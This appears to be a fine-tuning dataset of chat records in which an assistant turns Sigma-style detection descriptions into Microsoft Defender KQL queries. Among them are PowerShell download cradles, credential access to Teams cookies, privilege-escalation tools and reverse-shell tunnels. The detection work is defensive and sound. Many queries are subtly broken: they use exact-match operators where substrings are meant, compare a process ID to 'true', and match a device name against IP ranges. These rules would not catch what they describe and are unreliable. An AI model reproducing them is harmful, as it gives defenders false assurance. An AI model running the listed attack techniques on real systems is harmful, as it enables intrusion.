{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious process executions in which Sysmon itself is the parent of a process, which could be a sign of exploitation (e.g. CVE-2022-41120) Topic: proc_creation_win_exploit_cve_2022_41120_sysmon_eop"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\Sysmon.exe\", \"\\\\Sysmon64.exe\")) and (not(((FolderPath contains \":\\\\Windows\\\\Sysmon.exe\" or FolderPath contains \":\\\\Windows\\\\Sysmon64.exe\" or FolderPath contains \":\\\\Windows\\\\System32\\\\conhost.exe\" or FolderPath contains \":\\\\Windows\\\\System32\\\\WerFault.exe\" or FolderPath contains \":\\\\Windows\\\\System32\\\\WerFaultSecure.exe\" or FolderPath contains \":\\\\Windows\\\\System32\\\\wevtutil.exe\" or FolderPath contains \":\\\\Windows\\\\SysWOW64\\\\wevtutil.exe\" or FolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\Sysmon.exe\") or isnull(FolderPath))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect malicious GPO modifications can be used to implement many other malicious behaviors. Topic: proc_creation_win_reg_modify_group_policy_settings"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"GroupPolicyRefreshTimeDC\", \"GroupPolicyRefreshTimeOffsetDC\", \"GroupPolicyRefreshTime\", \"GroupPolicyRefreshTimeOffset\", \"EnableSmartScreen\", \"ShellSmartScreenLevel\")) and ProcessCommandLine =~ \"\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\System\" and (FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"forfiles\" with the \"/c\" flag.\nWhile this is an expected behavior of the tool, it can be abused in order to proxy execution through it with any binary.\nCan be used to bypass application whitelisting.\n Topic: proc_creation_win_forfiles_proxy_execution_"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\forfiles.exe\" or ProcessVersionInfoOriginalFileName =~ \"forfiles.exe\") and (ProcessCommandLine contains \" -c \" or ProcessCommandLine contains \" /c \" or ProcessCommandLine contains \" \u2013c \" or ProcessCommandLine contains \" \u2014c \" or ProcessCommandLine contains \" \u2015c \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet Topic: proc_creation_win_desktopimgdownldr_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \" /lockscreenurl:\" and (not((ProcessCommandLine in~ (\".jpg\", \".jpeg\", \".png\"))))) or (ProcessCommandLine in~ (\"reg delete\", \"\\\\PersonalizationCSP\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects WMIC executing \"process call create\" with suspicious calls to processes such as \"rundll32\", \"regsrv32\", etc. Topic: proc_creation_win_wmic_susp_process_creation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"rundll32\", \"bitsadmin\", \"regsvr32\", \"cmd.exe /c \", \"cmd.exe /k \", \"cmd.exe /r \", \"cmd /c \", \"cmd /k \", \"cmd /r \", \"powershell\", \"pwsh\", \"certutil\", \"cscript\", \"wscript\", \"mshta\", \"\\\\Users\\\\Public\\\\\", \"\\\\Windows\\\\Temp\\\\\", \"\\\\AppData\\\\Local\\\\\", \"%temp%\", \"%tmp%\", \"%ProgramData%\", \"%appdata%\", \"%comspec%\", \"%localappdata%\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects network connections to Devtunnels domains initiated by a process on a system. Attackers can abuse that feature to establish a reverse shell or persistence on a machine.\n Topic: net_connection_win_domain_devtunnels"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and RemoteUrl =~ \".devtunnels.ms\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious PowerShell invocation with a parameter substring Topic: proc_creation_win_powershell_susp_parameter_variation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -windowstyle h \", \" -windowstyl h\", \" -windowsty h\", \" -windowst h\", \" -windows h\", \" -windo h\", \" -wind h\", \" -win h\", \" -wi h\", \" -win h \", \" -win hi \", \" -win hid \", \" -win hidd \", \" -win hidde \", \" -NoPr \", \" -NoPro \", \" -NoProf \", \" -NoProfi \", \" -NoProfil \", \" -nonin \", \" -nonint \", \" -noninte \", \" -noninter \", \" -nonintera \", \" -noninterac \", \" -noninteract \", \" -noninteracti \", \" -noninteractiv \", \" -ec \", \" -encodedComman \", \" -encodedComma \", \" -encodedComm \", \" -encodedCom \", \" -encodedCo \", \" -encodedC \", \" -encoded \", \" -encode \", \" -encod \", \" -enco \", \" -en \", \" -executionpolic \", \" -executionpoli \", \" -executionpol \", \" -executionpo \", \" -executionp \", \" -execution bypass\", \" -executio bypass\", \" -executi bypass\", \" -execut bypass\", \" -execu bypass\", \" -exec bypass\", \" -exe bypass\", \" -ex bypass\", \" -ep bypass\", \" /windowstyle h \", \" /windowstyl h\", \" /windowsty h\", \" /windowst h\", \" /windows h\", \" /windo h\", \" /wind h\", \" /win h\", \" /wi h\", \" /win h \", \" /win hi \", \" /win hid \", \" /win hidd \", \" /win hidde \", \" /NoPr \", \" /NoPro \", \" /NoProf \", \" /NoProfi \", \" /NoProfil \", \" /nonin \", \" /nonint \", \" /noninte \", \" /noninter \", \" /nonintera \", \" /noninterac \", \" /noninteract \", \" /noninteracti \", \" /noninteractiv \", \" /ec \", \" /encodedComman \", \" /encodedComma \", \" /encodedComm \", \" /encodedCom \", \" /encodedCo \", \" /encodedC \", \" /encoded \", \" /encode \", \" /encod \", \" /enco \", \" /en \", \" /executionpolic \", \" /executionpoli \", \" /executionpol \", \" /executionpo \", \" /executionp \", \" /execution bypass\", \" /executio bypass\", \" /executi bypass\", \" /execut bypass\", \" /execu bypass\", \" /exec bypass\", \" /exe bypass\", \" /ex bypass\", \" /ep bypass\")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of 7z in order to compress a file with a \".dmp\"/\".dump\" extension, which could be a step in a process of dump file exfiltration. Topic: proc_creation_win_7zip_exfil_dmp_files"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".dmp\", \".dump\", \".hdmp\")) and (ProcessVersionInfoFileDescription contains \"7-Zip\" or (FolderPath endswith \"\\\\7z.exe\" or FolderPath endswith \"\\\\7zr.exe\" or FolderPath endswith \"\\\\7za.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"7z.exe\", \"7za.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52) Topic: registry_set_uac_bypass_winsat"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Root\\\\InventoryApplicationFile\\\\winsat.exe|\" and RegistryKey endswith \"\\\\LowerCaseLongPath\" and RegistryValueData startswith \"c:\\\\users\\\\\" and RegistryValueData endswith \"\\\\appdata\\\\local\\\\temp\\\\system32\\\\winsat.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects installation of a new shim using sdbinst.exe.\nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims\n Topic: proc_creation_win_sdbinst_shim_persistence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \".sdb\" and (FolderPath endswith \"\\\\sdbinst.exe\" or ProcessVersionInfoOriginalFileName =~ \"sdbinst.exe\")) and (not((InitiatingProcessFileName =~ \"\\\\msiexec.exe\" and (ProcessCommandLine in~ (\":\\\\Program Files (x86)\\\\IIS Express\\\\iisexpressshim.sdb\", \":\\\\Program Files\\\\IIS Express\\\\iisexpressshim.sdb\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential PowerShell execution from a DLL instead of the usual PowerShell process as seen used in PowerShdll.\nThis detection assumes that PowerShell commands are passed via the CommandLine.\n Topic: proc_creation_win_susp_powershell_execution_via_dll"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Default.GetString\", \"DownloadString\", \"FromBase64String\", \"ICM \", \"IEX \", \"Invoke-Command\", \"Invoke-Expression\")) and ((FolderPath endswith \"\\\\InstallUtil.exe\" or FolderPath endswith \"\\\\RegAsm.exe\" or FolderPath endswith \"\\\\RegSvcs.exe\" or FolderPath endswith \"\\\\regsvr32.exe\" or FolderPath endswith \"\\\\rundll32.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"InstallUtil.exe\", \"RegAsm.exe\", \"RegSvcs.exe\", \"REGSVR32.EXE\", \"RUNDLL32.EXE\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a explorer.exe sub process of the RazerInstaller software which can be invoked from the installer to select a different installation folder but can also be exploited to escalate privileges to LOCAL SYSTEM Topic: proc_creation_win_exploit_other_razorinstaller_lpe"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\RazerInstaller.exe\" and (InitiatingProcessIntegrityLevel in~ (\"System\", \"S-1-16-16384\"))) and (not(InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\Installer\\\\Razer\\\\Installer\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious execution of Msbuild.exe by a uncommon parent process Topic: proc_creation_win_msbuild_susp_parent_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\MSBuild.exe\" or ProcessVersionInfoOriginalFileName =~ \"MSBuild.exe\") and (not((InitiatingProcessFileName in~ (\"\\\\devenv.exe\", \"\\\\cmd.exe\", \"\\\\msbuild.exe\", \"\\\\python.exe\", \"\\\\explorer.exe\", \"\\\\nuget.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63) Topic: proc_creation_win_uac_bypass_dismhost"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"C:\\\\Users\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\DismHost.exe\")) and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects deletion of files with extensions often used for backup files. Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. Topic: file_delete_win_delete_backup_file"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".VHD\", \".bac\", \".bak\", \".wbcat\", \".bkf\", \".set\", \".win\", \".dsk\")) and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wt.exe\", \"\\\\rundll32.exe\", \"\\\\regsvr32.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a commandline containing references to the Microsoft Teams database or cookies files from a process other than Teams.\nThe database might contain authentication tokens and other sensitive information about the logged in accounts.\n Topic: proc_creation_win_teams_suspicious_command_line_cred_access"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\Microsoft\\\\Teams\\\\Cookies\", \"\\\\Microsoft\\\\Teams\\\\Local Storage\\\\leveldb\")) and (not(InitiatingProcessFolderPath =~ \"\\\\Microsoft\\\\Teams\\\\current\\\\Teams.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"findstr\" with specific flags and a remote share path. This specific set of CLI flags would allow \"findstr\" to download the content of the file located on the remote share as described in the LOLBAS entry.\n Topic: proc_creation_win_findstr_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"findstr\" or FolderPath endswith \"findstr.exe\" or ProcessVersionInfoOriginalFileName =~ \"FINDSTR.EXE\") and ((ProcessCommandLine contains \" -v \" or ProcessCommandLine contains \" /v \" or ProcessCommandLine contains \" \u2013v \" or ProcessCommandLine contains \" \u2014v \" or ProcessCommandLine contains \" \u2015v \") and (ProcessCommandLine contains \" -l \" or ProcessCommandLine contains \" /l \" or ProcessCommandLine contains \" \u2013l \" or ProcessCommandLine contains \" \u2014l \" or ProcessCommandLine contains \" \u2015l \") and ProcessCommandLine =~ \"\\\\\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detection of unusual child processes by different system processes Topic: proc_creation_win_susp_abusing_debug_privilege"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\cmd.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\", \"Cmd.Exe\"))) and ((InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and (InitiatingProcessFileName in~ (\"\\\\winlogon.exe\", \"\\\\services.exe\", \"\\\\lsass.exe\", \"\\\\csrss.exe\", \"\\\\smss.exe\", \"\\\\wininit.exe\", \"\\\\spoolsv.exe\", \"\\\\searchindexer.exe\")))) and (not((ProcessCommandLine in~ (\" route \", \" ADD \"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to use screencapture to collect macOS screenshots Topic: proc_creation_macos_screencapture"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath =~ \"/usr/sbin/screencapture\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious file downloads directly from IP addresses using Wget.exe Topic: proc_creation_win_wget_download_direct_ip"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \".ps1\" or ProcessCommandLine endswith \".ps1'\" or ProcessCommandLine endswith \".ps1\\\"\" or ProcessCommandLine endswith \".dat\" or ProcessCommandLine endswith \".dat'\" or ProcessCommandLine endswith \".dat\\\"\" or ProcessCommandLine endswith \".msi\" or ProcessCommandLine endswith \".msi'\" or ProcessCommandLine endswith \".msi\\\"\" or ProcessCommandLine endswith \".bat\" or ProcessCommandLine endswith \".bat'\" or ProcessCommandLine endswith \".bat\\\"\" or ProcessCommandLine endswith \".exe\" or ProcessCommandLine endswith \".exe'\" or ProcessCommandLine endswith \".exe\\\"\" or ProcessCommandLine endswith \".vbs\" or ProcessCommandLine endswith \".vbs'\" or ProcessCommandLine endswith \".vbs\\\"\" or ProcessCommandLine endswith \".vbe\" or ProcessCommandLine endswith \".vbe'\" or ProcessCommandLine endswith \".vbe\\\"\" or ProcessCommandLine endswith \".hta\" or ProcessCommandLine endswith \".hta'\" or ProcessCommandLine endswith \".hta\\\"\" or ProcessCommandLine endswith \".dll\" or ProcessCommandLine endswith \".dll'\" or ProcessCommandLine endswith \".dll\\\"\" or ProcessCommandLine endswith \".psm1\" or ProcessCommandLine endswith \".psm1'\" or ProcessCommandLine endswith \".psm1\\\"\") and (ProcessCommandLine matches regex \"\\\\s-O\\\\s\" or ProcessCommandLine contains \"--output-document\") and ProcessCommandLine =~ \"http\" and (FolderPath endswith \"\\\\wget.exe\" or ProcessVersionInfoOriginalFileName =~ \"wget.exe\") and ProcessCommandLine matches regex \"://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros Topic: proc_creation_win_office_outlook_enable_unsafe_client_mail_rules"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"\\\\Outlook\\\\Security\\\\EnableUnsafeClientMailRules\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry keys created in OceanLotus (also known as APT32) attacks Topic: registry_event_apt_oceanlotus_registry"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\{E08A0F4B-1F65-4D4D-9A09-BD4625B9C5A1}\\\\Model\" or (RegistryKey endswith \"Classes\\\\AppXc52346ec40fb4061ad96be0e6cb7d16a*\" or RegistryKey endswith \"Classes\\\\AppX3bbba44c6cae4d9695755183472171e2*\" or RegistryKey endswith \"Classes\\\\CLSID\\\\{E3517E26-8E93-458D-A6DF-8030BC80528B}*\" or RegistryKey contains \"Classes\\\\CLSID\\\\{E08A0F4B-1F65-4D4D-9A09-BD4625B9C5A1}\\\\Model\") or (RegistryKey endswith \"\\\\SOFTWARE\\\\App*\" and ((RegistryKey endswith \"AppXbf13d4ea2945444d8b13e2121cb6b663*\" or RegistryKey endswith \"AppX70162486c7554f7f80f481985d67586d*\" or RegistryKey endswith \"AppX37cc7fdccd644b4f85f4b22d5a3f105a*\") and (RegistryKey endswith \"Application\" or RegistryKey endswith \"DefaultIcon\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential suspicious execution of a GUID like folder name located in a suspicious location such as %TEMP% as seen being used in IcedID attacks.\nUse this rule to hunt for potentially suspicious activity stemming from uncommon folders.\n Topic: proc_creation_win_susp_execution_from_guid_folder_names"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"\\\\AppData\\\\Roaming\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\")) and (ProcessCommandLine in~ (\"\\\\{\", \"}\\\\\"))) and (not((FolderPath =~ \"C:\\\\Windows\\\\System32\\\\drvinst.exe\" or (FolderPath contains \"\\\\{\" and FolderPath contains \"}\\\\\") or (FolderPath in~ (\"C:\\\\Windows\\\\System32\\\\msiexec.exe\", \"C:\\\\Windows\\\\SysWOW64\\\\msiexec.exe\")) or isnull(FolderPath))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious ways to download files or content using PowerShell Topic: proc_creation_win_powershell_download_cradles"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\".DownloadString(\", \".DownloadFile(\", \"Invoke-WebRequest \", \"iwr \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious filenames that contain a right-to-left override character and a potentially spoofed file extensions.\n Topic: file_event_win_susp_right_to_left_override_extension_spoofing"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"fpd..\", \"nls..\", \"vsc..\", \"xcod.\", \"xslx.\")) and FileName =~ \"\\\\u202e\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to enumerate file shares, printer shares and sessions using \"net.exe\" with the \"view\" flag. Topic: proc_creation_win_net_view_share_and_sessions_enum"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"view\" and ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")))) and (not(ProcessCommandLine =~ \"\\\\\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the stopping of a Windows service via the \"sc.exe\" utility Topic: proc_creation_win_sc_stop_service"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" stop \" and (ProcessVersionInfoOriginalFileName =~ \"sc.exe\" or FolderPath endswith \"\\\\sc.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect modification of the startup key to a path where a payload could be stored to be launched during startup Topic: registry_set_susp_user_shell_folders"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders\" and RegistryKey endswith \"Startup\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on book.hacktricks.xyz Topic: proc_creation_win_hktl_winpeas"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/\" or (ProcessCommandLine in~ (\" applicationsinfo\", \" browserinfo\", \" eventsinfo\", \" fileanalysis\", \" filesinfo\", \" processinfo\", \" servicesinfo\", \" windowscreds\")) or (InitiatingProcessCommandLine endswith \" -linpeas\" or ProcessCommandLine endswith \" -linpeas\") or (ProcessVersionInfoOriginalFileName =~ \"winPEAS.exe\" or (FolderPath endswith \"\\\\winPEASany_ofs.exe\" or FolderPath endswith \"\\\\winPEASany.exe\" or FolderPath endswith \"\\\\winPEASx64_ofs.exe\" or FolderPath endswith \"\\\\winPEASx64.exe\" or FolderPath endswith \"\\\\winPEASx86_ofs.exe\" or FolderPath endswith \"\\\\winPEASx86.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the \"git\" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n Topic: proc_creation_lnx_git_shell_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine in~ (\" -p \", \"help\")) and InitiatingProcessFileName =~ \"/git\" and (ProcessCommandLine in~ (\"bash 0<&1\", \"dash 0<&1\", \"sh 0<&1\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious call to Invoke-WebRequest cmdlet where the and output is located in a suspicious location Topic: proc_creation_win_powershell_invoke_webrequest_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"curl \", \"Invoke-WebRequest\", \"iwr \", \"wget \")) and (ProcessCommandLine in~ (\" -ur\", \" -o\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\"))) and (ProcessCommandLine in~ (\"\\\\AppData\\\\\", \"\\\\Desktop\\\\\", \"\\\\Temp\\\\\", \"\\\\Users\\\\Public\\\\\", \"%AppData%\", \"%Public%\", \"%Temp%\", \"%tmp%\", \":\\\\Windows\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of files with certain extensions on a static web site. This can be indicative of potential uploads of a web shell. Topic: file_event_win_webshell_creation_detect"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (((FileName in~ (\".ashx\", \".asp\", \".ph\", \".soap\")) and FileName =~ \"\\\\inetpub\\\\wwwroot\\\\\") or (FileName =~ \".ph\" and (FileName in~ (\"\\\\www\\\\\", \"\\\\htdocs\\\\\", \"\\\\html\\\\\")))) and (not((FileName =~ \"\\\\xampp\" or InitiatingProcessFolderPath =~ \"System\" or (FileName in~ (\"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\Windows\\\\Temp\\\\\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the legitimate Autoit3 utility from a suspicious parent process. AutoIt3.exe is used within\nthe DarkGate infection chain to execute shellcode that performs process injection and connects to the DarkGate\ncommand-and-control server.\n Topic: proc_creation_win_malware_darkgate_autoit3_from_susp_parent_and_location"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\KeyScramblerLogon.exe\", \"\\\\msiexec.exe\")) and (FolderPath endswith \"\\\\Autoit3.exe\" or ProcessVersionInfoOriginalFileName =~ \"AutoIt3.exe\")) and (not((InitiatingProcessFolderPath in~ (\":\\\\Program Files (x86)\\\\AutoIt3\\\\AutoIt3.exe\", \":\\\\Program Files\\\\AutoIt3\\\\AutoIt3.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects programs that connect to uncommon destination ports Topic: net_connection_win_susp_malware_callback_ports_uncommon"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and (RemotePort in~ (\"8080\", \"8888\"))) and (not((InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"169.254.0.0/16\", \"::1/128\", \"fe80::/10\", \"fc00::/7\")))) and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\\", \"C:\\\\Program Files (x86)\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the PUA/Recon tool Seatbelt via PE information of command line parameters Topic: proc_creation_win_pua_seatbelt"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\Seatbelt.exe\" or ProcessVersionInfoOriginalFileName =~ \"Seatbelt.exe\" or ProcessVersionInfoFileDescription =~ \"Seatbelt\" or (ProcessCommandLine contains \" DpapiMasterKeys\" or ProcessCommandLine contains \" InterestingProcesses\" or ProcessCommandLine contains \" InterestingFiles\" or ProcessCommandLine contains \" CertificateThumbprints\" or ProcessCommandLine contains \" ChromiumBookmarks\" or ProcessCommandLine contains \" ChromiumHistory\" or ProcessCommandLine contains \" ChromiumPresence\" or ProcessCommandLine contains \" CloudCredentials\" or ProcessCommandLine contains \" CredEnum\" or ProcessCommandLine contains \" CredGuard\" or ProcessCommandLine contains \" FirefoxHistory\" or ProcessCommandLine contains \" ProcessCreationEvents\")) or ((ProcessCommandLine in~ (\" -group=misc\", \" -group=remote\", \" -group=chromium\", \" -group=slack\", \" -group=system\", \" -group=user\", \" -group=all\")) and ProcessCommandLine =~ \" -outputfile=\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities Topic: proc_creation_win_schtasks_disable"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\Windows\\\\BitLocker\", \"\\\\Windows\\\\ExploitGuard\", \"\\\\Windows\\\\ExploitGuard\\\\ExploitGuard MDM policy Refresh\", \"\\\\Windows\\\\SystemRestore\\\\SR\", \"\\\\Windows\\\\UpdateOrchestrator\\\\\", \"\\\\Windows\\\\Windows Defender\\\\\", \"\\\\Windows\\\\WindowsBackup\\\\\", \"\\\\Windows\\\\WindowsUpdate\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\""}]}
